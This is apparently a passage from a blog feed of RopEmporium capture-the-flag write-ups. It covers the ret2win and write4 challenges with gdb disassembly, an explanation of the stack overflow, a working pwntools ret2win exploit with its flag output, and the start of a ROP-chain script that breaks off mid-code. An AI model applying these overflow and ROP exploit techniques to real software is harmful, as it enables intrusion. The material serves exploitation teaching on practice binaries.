   <span class="token number">0x00000000004006d2</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">59</span><span class="token operator">></span>:	call   <span class="token number">0x4006e8</span> <span class="token operator">&lt;</span>pwnme<span class="token operator">></span>
   <span class="token number">0x00000000004006d7</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">64</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x400828</span>
   <span class="token number">0x00000000004006dc</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">69</span><span class="token operator">></span>:	call   <span class="token number">0x400550</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
   <span class="token number">0x00000000004006e1</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">74</span><span class="token operator">></span>:	mov    <span class="token register variable">eax</span>,<span class="token number">0x0</span>
   <span class="token number">0x00000000004006e6</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">79</span><span class="token operator">></span>:	pop    <span class="token register variable">rbp</span>
   <span class="token number">0x00000000004006e7</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">80</span><span class="token operator">></span>:	ret
End of assembler dump.
(gdb)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>From the initial analysis of the main function,main call an interesting function called <strong>pwnme</strong>. Next is to disassemble <strong>pwnme</strong> function to understand the behavior.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">(gdb) disas pwnme
Dump of assembler code for function pwnme:
   <span class="token number">0x00000000004006e8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span>:	push   <span class="token register variable">rbp</span>
   <span class="token number">0x00000000004006e9</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">></span>:	mov    <span class="token register variable">rbp</span>,<span class="token register variable">rsp</span>
   <span class="token number">0x00000000004006ec</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span>:	sub    <span class="token register variable">rsp</span>,<span class="token number">0x20</span>
   <span class="token number">0x00000000004006f0</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">></span>:	lea    <span class="token register variable">rax</span>,<span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">]</span>
   <span class="token number">0x00000000004006f4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">12</span><span class="token operator">></span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x20</span>
   <span class="token number">0x00000000004006f9</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">17</span><span class="token operator">></span>:	mov    <span class="token register variable">esi</span>,<span class="token number">0x0</span>
   <span class="token number">0x00000000004006fe</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">22</span><span class="token operator">></span>:	mov    <span class="token register variable">rdi</span>,<span class="token register variable">rax</span>
   <span class="token number">0x0000000000400701</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">25</span><span class="token operator">></span>:	call   <span class="token number">0x400580</span> <span class="token operator">&lt;</span>memset@plt<span class="token operator">></span>
   <span class="token number">0x0000000000400706</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">30</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x400838</span>
   <span class="token number">0x000000000040070b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">35</span><span class="token operator">></span>:	call   <span class="token number">0x400550</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
   <span class="token number">0x0000000000400710</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">40</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x400898</span>
   <span class="token number">0x0000000000400715</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">45</span><span class="token operator">></span>:	call   <span class="token number">0x400550</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
   <span class="token number">0x000000000040071a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">50</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x4008b8</span>
   <span class="token number">0x000000000040071f</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">55</span><span class="token operator">></span>:	call   <span class="token number">0x400550</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
   <span class="token number">0x0000000000400724</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">60</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x400918</span>
   <span class="token number">0x0000000000400729</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">65</span><span class="token operator">></span>:	mov    <span class="token register variable">eax</span>,<span class="token number">0x0</span>
   <span class="token number">0x000000000040072e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">70</span><span class="token operator">></span>:	call   <span class="token number">0x400570</span> <span class="token operator">&lt;</span>printf@plt<span class="token operator">></span>
   <span class="token number">0x0000000000400733</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">75</span><span class="token operator">></span>:	lea    <span class="token register variable">rax</span>,<span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">]</span>
   <span class="token number">0x0000000000400737</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">79</span><span class="token operator">></span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x38</span>
   <span class="token number">0x000000000040073c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">84</span><span class="token operator">></span>:	mov    <span class="token register variable">rsi</span>,<span class="token register variable">rax</span>
   <span class="token number">0x000000000040073f</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">87</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x0</span>
   <span class="token number">0x0000000000400744</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">92</span><span class="token operator">></span>:	call   <span class="token number">0x400590</span> <span class="token operator">&lt;</span>read@plt<span class="token operator">></span>
   <span class="token number">0x0000000000400749</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">97</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x40091b</span>
   <span class="token number">0x000000000040074e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">102</span><span class="token operator">></span>:	call   <span class="token number">0x400550</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
   <span class="token number">0x0000000000400753</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">107</span><span class="token operator">></span>:	nop
   <span class="token number">0x0000000000400754</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">108</span><span class="token operator">></span>:	leave
   <span class="token number">0x0000000000400755</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">109</span><span class="token operator">></span>:	ret
End of assembler dump.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>From analysis of the above assembly code, we fill a buffer of size 0x20(32bytes) with a constant byte of zero. <strong>memset</strong> is used to overwrite any values present memory area specified. The memory we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32 bytes from the address of base pointer as shown in the stack diagram below.</p>
<p><img data-src="/images/ropemporium/stack.png"></p>
<p>Next function is <strong>read</strong> function, which reads from the standard input file descriptor and stores in the specified buffer.From the disassembled code we are reading 0x38 bytes from the user input and storing it in our buffer.</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">)</span> <span class="token comment">//0 is file descriptor stdin</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Because we are reading more than what the buffer can hold, we corrupt the adjacent memory regions therefore causing a stack buffer overflow. Therefore in order to control the return address as shown in the stack image above is to fill the buffer, overwrite the <code>rbp</code> register and control the return address with <strong>ret2win</strong> function address.</p>
<p>The exploit code for this ret2win function is,</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pwn

pwn<span class="token punctuation">.</span>context<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">"latin-1"</span>
pwn<span class="token punctuation">.</span>warnings<span class="token punctuation">.</span>simplefilter<span class="token punctuation">(</span><span class="token string">"ignore"</span><span class="token punctuation">)</span>
pwn<span class="token punctuation">.</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>

io <span class="token operator">=</span> pwn<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">'./ret2win'</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">32</span> <span class="token comment"># fill the buffer</span>
payload <span class="token operator">+=</span> <span class="token string">b"B"</span> <span class="token operator">*</span> <span class="token number">8</span>  <span class="token comment">#overwrite saved base pointer</span>
payload <span class="token operator">+=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x400756</span><span class="token punctuation">)</span>  <span class="token comment">#Address of ret2win function</span>
io<span class="token punctuation">.</span>writeafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

pwn<span class="token punctuation">.</span>info<span class="token punctuation">(</span>io<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Running the above script we get correct flag.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vx@archie:ret2win$ python3 x.py
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting <span class="token builtin class-name">local</span> process <span class="token string">'./ret2win'</span><span class="token builtin class-name">:</span> pid <span class="token number">45427</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  Thank you<span class="token operator">!</span>
    Well done<span class="token operator">!</span> Here<span class="token string">'s your flag:
    ROPE&#123;a_placeholder_32byte_flag!&#125;
[*] Process '</span>./ret2win' stopped with <span class="token builtin class-name">exit</span> code <span class="token number">0</span> <span class="token punctuation">(</span>pid <span class="token number">45427</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <tags>
        <tag>ropemporium</tag>
        <tag>rop</tag>
      </tags>
  </entry>
  <entry>
    <title>RopEmporium write4 challenge</title>
    <url>/2021/12/17/ROP-write4/</url>
    <content><![CDATA[<p>Goal of the challenge is understanding how to abuse readable and writable memory regions in binary files.The target binary can be downloaded from the authors website <a href="https://ropemporium.com/">ropemporium</a>.</p>
<span id="more"></span>

<blockquote>
<p>Our first foray into proper gadget use.<br>A useful function is still present, but we’ll need to write a string into memory somehow.</p>
</blockquote>
<p>First we check the binary protections enabled on the binary. Only <strong>NX</strong> (Not executable) protection is enabled on the binary according to <code>checksec</code> binary utility as shown in the image below.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>For analysis of binary, we will use gdb debugger to analyze the functions. For analysis of our binary we start at the <code>main</code> function which is the entrypoint of our execution.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">(gdb) disas main
Dump of assembler code for function main:
   <span class="token number">0x0000000000400607</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span>:	push   <span class="token register variable">rbp</span>
   <span class="token number">0x0000000000400608</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">></span>:	mov    <span class="token register variable">rbp</span>,<span class="token register variable">rsp</span>
   <span class="token number">0x000000000040060b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span>:	call   <span class="token number">0x400500</span> <span class="token operator">&lt;</span>pwnme@plt<span class="token operator">></span>
   <span class="token number">0x0000000000400610</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">9</span><span class="token operator">></span>:	mov    <span class="token register variable">eax</span>,<span class="token number">0x0</span>
   <span class="token number">0x0000000000400615</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">14</span><span class="token operator">></span>:	pop    <span class="token register variable">rbp</span>
   <span class="token number">0x0000000000400616</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">15</span><span class="token operator">></span>:	ret
End of assembler dump.
(gdb)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>From the above, the main function only calls <code>pwnme</code> function which looks interesting to us. Disassemble the <strong>pwnme</strong> function as shown below. <code>pwnme@plt</code> is used for referencing <code>pwnme</code> real address. Next step is analyzing <code>libwrite4.so</code> library using gdb.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm"><span class="token label function">vx@archie:</span>write4<span class="token operator">$</span> gdb <span class="token operator">-</span>q libwrite4.so
Reading symbols from libwrite4.so...
(No debugging symbols found in libwrite4.so)
(gdb) disas pwnme
Dump of assembler code for function pwnme:
   <span class="token number">0x00000000000008aa</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span>:	push   <span class="token register variable">rbp</span>
   <span class="token number">0x00000000000008ab</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">></span>:	mov    <span class="token register variable">rbp</span>,<span class="token register variable">rsp</span>
   <span class="token number">0x00000000000008ae</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span>:	sub    <span class="token register variable">rsp</span>,<span class="token number">0x20</span>
   <span class="token number">0x00000000000008b2</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">></span>:	mov    <span class="token register variable">rax</span>,QWORD PTR <span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x200727</span><span class="token operator">]</span>        # <span class="token number">0x200fe0</span>
   <span class="token number">0x00000000000008b9</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">15</span><span class="token operator">></span>:	mov    <span class="token register variable">rax</span>,QWORD PTR <span class="token operator">[</span><span class="token register variable">rax</span><span class="token operator">]</span>
   <span class="token number">0x00000000000008bc</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">18</span><span class="token operator">></span>:	mov    <span class="token register variable">ecx</span>,<span class="token number">0x0</span>
   <span class="token number">0x00000000000008c1</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">23</span><span class="token operator">></span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x2</span>
   <span class="token number">0x00000000000008c6</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">28</span><span class="token operator">></span>:	mov    <span class="token register variable">esi</span>,<span class="token number">0x0</span>
   <span class="token number">0x00000000000008cb</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">33</span><span class="token operator">></span>:	mov    <span class="token register variable">rdi</span>,<span class="token register variable">rax</span>
   <span class="token number">0x00000000000008ce</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">36</span><span class="token operator">></span>:	call   <span class="token number">0x790</span> <span class="token operator">&lt;</span>setvbuf@plt<span class="token operator">></span>
   <span class="token number">0x00000000000008d3</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">41</span><span class="token operator">></span>:	lea    <span class="token register variable">rdi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x106</span><span class="token operator">]</span>        # <span class="token number">0x9e0</span>
   <span class="token number">0x00000000000008da</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">48</span><span class="token operator">></span>:	call   <span class="token number">0x730</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
   <span class="token number">0x00000000000008df</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">53</span><span class="token operator">></span>:	lea    <span class="token register variable">rdi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x111</span><span class="token operator">]</span>        # <span class="token number">0x9f7</span>
   <span class="token number">0x00000000000008e6</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">60</span><span class="token operator">></span>:	call   <span class="token number">0x730</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
   <span class="token number">0x00000000000008eb</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">65</span><span class="token operator">></span>:	lea    <span class="token register variable">rax</span>,<span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">]</span>
   <span class="token number">0x00000000000008ef</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">69</span><span class="token operator">></span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x20</span>
   <span class="token number">0x00000000000008f4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">74</span><span class="token operator">></span>:	mov    <span class="token register variable">esi</span>,<span class="token number">0x0</span>
   <span class="token number">0x00000000000008f9</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">79</span><span class="token operator">></span>:	mov    <span class="token register variable">rdi</span>,<span class="token register variable">rax</span>
   <span class="token number">0x00000000000008fc</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">82</span><span class="token operator">></span>:	call   <span class="token number">0x760</span> <span class="token operator">&lt;</span>memset@plt<span class="token operator">></span>
   <span class="token number">0x0000000000000901</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">87</span><span class="token operator">></span>:	lea    <span class="token register variable">rdi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0xf8</span><span class="token operator">]</span>        # <span class="token number">0xa00</span>
   <span class="token number">0x0000000000000908</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">94</span><span class="token operator">></span>:	call   <span class="token number">0x730</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
   <span class="token number">0x000000000000090d</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">99</span><span class="token operator">></span>:	lea    <span class="token register variable">rdi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x115</span><span class="token operator">]</span>        # <span class="token number">0xa29</span>
   <span class="token number">0x0000000000000914</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">106</span><span class="token operator">></span>:	mov    <span class="token register variable">eax</span>,<span class="token number">0x0</span>
   <span class="token number">0x0000000000000919</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">111</span><span class="token operator">></span>:	call   <span class="token number">0x750</span> <span class="token operator">&lt;</span>printf@plt<span class="token operator">></span>
   <span class="token number">0x000000000000091e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">116</span><span class="token operator">></span>:	lea    <span class="token register variable">rax</span>,<span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">]</span>
   <span class="token number">0x0000000000000922</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">120</span><span class="token operator">></span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x200</span>
   <span class="token number">0x0000000000000927</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">125</span><span class="token operator">></span>:	mov    <span class="token register variable">rsi</span>,<span class="token register variable">rax</span>
   <span class="token number">0x000000000000092a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">128</span><span class="token operator">></span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x0</span>
   <span class="token number">0x000000000000092f</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">133</span><span class="token operator">></span>:	call   <span class="token number">0x770</span> <span class="token operator">&lt;</span>read@plt<span class="token operator">></span>
   <span class="token number">0x0000000000000934</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">138</span><span class="token operator">></span>:	lea    <span class="token register variable">rdi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0xf1</span><span class="token operator">]</span>        # <span class="token number">0xa2c</span>
   <span class="token number">0x000000000000093b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">145</span><span class="token operator">></span>:	call   <span class="token number">0x730</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
   <span class="token number">0x0000000000000940</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">150</span><span class="token operator">></span>:	nop
   <span class="token number">0x0000000000000941</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">151</span><span class="token operator">></span>:	leave
   <span class="token number">0x0000000000000942</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">152</span><span class="token operator">></span>:	ret
End of assembler dump.
(gdb)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>From the assembly code above, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. <code>memset</code> libc function is used to overwrite any values that have the memory area specified. The memory we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32 bytes from the address of base pointer in the stack.</p>
<p><img data-src="/images/ropemporium/stack.png"></p>
<p>Therefore the next interesting libc function is <strong>read</strong> function, which reads user input and stores results in the specified buffer.From the above disassembled code, we are reading 0x200 bytes from the user and storing it in our buffer. This means we are reading more than what the buffer can hold, therefore leading to a stack buffer overflow.</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// read(0,[rbp-0x20], 0x200)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>From the vulnerability,we can exploit it in order to abuse the control flow of the program by controlling the value of the return address.</p>
<p>From the authors hint, we need to look for an ELF section that is writable in order to write our target string.</p>
<blockquote>
<p>Perhaps the most important thing to consider in this challenge is where we’re going to write our “flag.txt” string. Use rabin2 or readelf to check out the different sections of this binary and their permissions. Learn a little about ELF sections and their purpose.</p>
</blockquote>
<p>Opening the binary in radare2, we can check permissions of different sections using the command <strong>iS</strong> as shown in the image below.</p>
<p><img data-src="/images/ropemporium/write4_where.png"></p>
<p>From the above we are able to determine the data and bss section are both readable and writable. Our target for the gadgets is to write our string to the <strong>bss</strong> section. Therefore we need to get memory address of <strong>.bss</strong> area.</p>
<p>From the authors challenge hint, we need to disassemble <code>usefulFunction</code> to understand how it works.</p>
<blockquote>
<p>Important!: A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like “flag.txt”) as the 1st argument.</p>
</blockquote>
<p><code>usefulFunction</code> function is responsible for calling <strong>print_file</strong> function as hinted by the author.</p>
<p><img data-src="/images/ropemporium/write4_useful.png"></p>
<p>From the analysis of the above function, we can determine we are passing a string file name called <strong>“nonexistent”</strong> to the print_file function. The content of the arguments passed to the print_file function will be printed out to the user. Our goal is to pass our string of interest <strong>flag.txt</strong> to the the print_file function.</p>
<p>From the disassembly of the binary we have another interesting function called <strong>usefulGadgets</strong>.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">(gdb) disas usefulGadgets
Dump of assembler code for function usefulGadgets:
   <span class="token number">0x0000000000400628</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span>:	mov    QWORD PTR <span class="token operator">[</span><span class="token register variable">r14</span><span class="token operator">]</span>,<span class="token register variable">r15</span>
   <span class="token number">0x000000000040062b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">3</span><span class="token operator">></span>:	ret
   <span class="token number">0x000000000040062c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span>:	nop    DWORD PTR <span class="token operator">[</span><span class="token register variable">rax</span><span class="token operator">+</span><span class="token number">0x0</span><span class="token operator">]</span>
End of assembler dump.
(gdb)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The gadget from the above assembly code will enable us to write content of <code>r15</code> register to memory address [r14]. Next step is to look for gadgets that will enable us to control both <strong>r14</strong> and <strong>r15</strong> register values.</p>
<p>For building our chain, we need to understand the calling conventions of AMD64 ABI.The calling convention passes the arguments to the registers in the following order. RDI, RSI, RDX, RCX, R8 and R9.In x86 assembly <strong>pop</strong> instruction is used for putting value to the memory address, therefore we look for a pop gadget that will enable to control both <code>r14</code> and <code>r15</code>.</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm"><span class="token number">0x0040068f</span>                 <span class="token number">5d</span>  pop <span class="token register variable">rbp</span>
<span class="token number">0x00400690</span>               415e  pop <span class="token register variable">r14</span>
<span class="token number">0x00400692</span>               415f  pop <span class="token register variable">r15</span>
<span class="token number">0x00400694</span>                 c3  ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>Example of the above gadget, we have a pop rbp, pop r14, pop 15 ret instruction gadget. This gadget will enable us to control the desired registers. Because we don’t need the rbp register, for our ropchain, we take the address pointed by pop14 <strong>0x00400690</strong>. This is possible because rop gadgets are set of instructions that end with <strong>ret</strong>.</p>
<p>From the disassembly of <code>usefulgadgets</code> function we know register r14 points to a memory region we want to write to. Therefore our strategy is to set the value of r14 register to be the address pointer of <strong>.bss</strong> section of ELF and r15 register to be the value we want to write to <strong>.bss</strong> section.</p>
<blockquote>
<p>Hopefully you’ve realized that ROP is just a form of arbitrary code execution and if we get creative we can leverage it to do things like write to or read from memory. The question we need to answer is: what mechanism are we going to use to solve this problem? Is there any built-in functionality to do the writing or do we need to use gadgets? In this challenge we won’t be using built-in functionality since that’s too similar to the previous challenges, instead we’ll be looking for gadgets that let us write a value to memory such as mov [reg], reg.</p>
</blockquote>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm"><span class="token number">0x00400628</span>             4d893e  mov qword <span class="token operator">[</span><span class="token register variable">r14</span><span class="token operator">]</span>, <span class="token register variable">r15</span>
<span class="token number">0x0040062b</span>                 c3  ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>Therefore, two gadgets will enable us to set the register values of <code>r14</code> and <code>r15</code> and copy the values of r15 to the memory region defined by r14.</p>
<p>Last is a find a gadget that will aid passing of an argument to the <code>print_file</code> function. Because the function takes one argument, we look for a <code>pop rdi ret</code> instruction</p>
<pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm"><span class="token number">0x00400693</span>                 5f  pop <span class="token register variable">rdi</span>
<span class="token number">0x00400694</span>                 c3  ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>Now we have three separate rop gadgets, which we can chain them together to get a fully working rop chain. This chain will enable us to read the file content of the <strong>flag.txt</strong> and display output to the console.</p>
<p>A fully working ropchain exploit code of the challenge is,</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pwn

pwn<span class="token punctuation">.</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
pwn<span class="token punctuation">.</span>context<span class="token punctuation">.</span>encoding <span class="token operator">=</span><span class="token string">"latin-1"</span>
pwn<span class="token punctuation">.</span>warnings<span class="token punctuation">.</span>simplefilter<span class="token punctuation">(</span><span class="token string">"ignore"</span><span class="token punctuation">)</span>
io <span class="token operator">=</span> pwn<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">'./write4'</span><span class="token punctuation">)</span>

bss_area <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x00601038</span><span class="token punctuation">)</span>
pop_r14_r15 <span class="token operator">=</span> pwn<span class="token punctuation">.</span>p64<span class="token punctuation">(</span><span class="token number">0x00400690</span><span class="token punctuation">)</span>
